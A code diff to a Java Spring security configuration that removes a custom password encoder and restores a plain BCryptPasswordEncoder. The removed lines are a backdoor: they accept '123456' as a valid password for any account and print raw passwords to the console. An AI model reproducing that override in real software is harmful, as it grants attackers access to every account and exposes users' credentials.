@@ -63,16 +63,7 @@ public class SecurityConfig {
 
     @Bean
     public PasswordEncoder passwordEncoder() {
-        return new BCryptPasswordEncoder() {
-            @Override
-            public boolean matches(CharSequence rawPassword, String encodedPassword) {
-                System.out.println("DEBUG matches: raw=" + rawPassword + ", encoded=" + encodedPassword);
-                if ("123456".equals(rawPassword.toString())) {
-                    return true;
-                }
-                return super.matches(rawPassword, encodedPassword);
-            }
-        };
+        return new BCryptPasswordEncoder();
     }
 
     @Bean
